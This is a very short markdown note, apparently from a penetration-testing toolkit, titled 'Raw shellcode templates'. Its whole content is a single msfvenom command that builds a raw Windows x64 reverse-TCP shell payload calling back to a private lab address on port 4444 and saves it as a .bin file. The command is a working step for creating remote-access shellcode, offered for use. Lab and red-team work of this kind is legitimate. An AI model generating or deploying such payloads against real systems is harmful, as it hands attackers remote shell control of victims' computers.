# Raw shellcode templates
- Create one here
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.122.1 LPORT=4444 -f raw > defaul_192-168-122-1_4444.bin
```